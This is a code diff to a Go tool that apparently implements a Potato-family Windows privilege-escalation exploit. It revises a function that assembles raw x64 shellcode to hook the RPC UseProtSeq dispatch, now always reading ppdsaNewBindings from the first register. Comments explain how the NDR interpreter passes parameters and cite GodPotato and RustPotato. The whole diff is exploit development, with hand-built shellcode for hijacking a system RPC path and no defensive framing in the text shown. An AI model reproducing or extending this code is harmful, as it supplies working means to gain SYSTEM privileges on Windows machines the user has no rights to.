@@ -198,28 +198,17 @@ const hookFlagOffset = 128
 // buildNativeHook creates a native x64 shellcode hook for the UseProtSeq dispatch.
 // Using raw shellcode instead of syscall.NewCallback avoids crashes caused by Go's
 // callback trampoline interacting with the NDR interpreter's RPC dispatch thread.
-// The shellcode reads ppdsaNewBindings from the correct parameter position,
-// writes the pre-allocated DSA buffer address, sets a flag, and returns 0.
+// The NDR interpreter strips handle_t and [in]-only parameters before calling the
+// manager routine, so ppdsaNewBindings ([in,out]) is the FIRST parameter (RCX).
+// This matches GodPotato/RustPotato which both receive ppdsaNewBindings as param 0.
 func buildNativeHook(paramCount int, dsaBufAddr uintptr) (hookAddr uintptr, err error) {
-	ppdsaIndex := paramCount - 2
 	code := make([]byte, 0, 80)
 
-	// Step 1: Load ppdsaNewBindings into RAX from the correct parameter position.
-	// x64 Windows calling convention: RCX=p0, RDX=p1, R8=p2, R9=p3, stack=p4+
-	switch ppdsaIndex {
-	case 0:
-		code = append(code, 0x48, 0x89, 0xC8) // mov rax, rcx
-	case 1:
-		code = append(code, 0x48, 0x89, 0xD0) // mov rax, rdx
-	case 2:
-		code = append(code, 0x4C, 0x89, 0xC0) // mov rax, r8
-	case 3:
-		code = append(code, 0x4C, 0x89, 0xC8) // mov rax, r9
-	default:
-		// Stack parameter: [RSP + 8*(ppdsaIndex+1)]
-		offset := byte(8 * (ppdsaIndex + 1))
-		code = append(code, 0x48, 0x8B, 0x44, 0x24, offset) // mov rax, [rsp+offset]
-	}
+	// Step 1: Load ppdsaNewBindings into RAX from parameter 0 (RCX).
+	// The NDR Oicf interpreter calls manager routines with [in,out] and [out]
+	// parameters only — handle_t and pure [in] params are handled by the engine.
+	// For ORCB UseProtSeq: ppdsaNewBindings is param 0, ppdsaNewSecurity is param 1.
+	code = append(code, 0x48, 0x89, 0xC8) // mov rax, rcx
 
 	// Step 2: test rax, rax — check for null pointer
 	code = append(code, 0x48, 0x85, 0xC0)
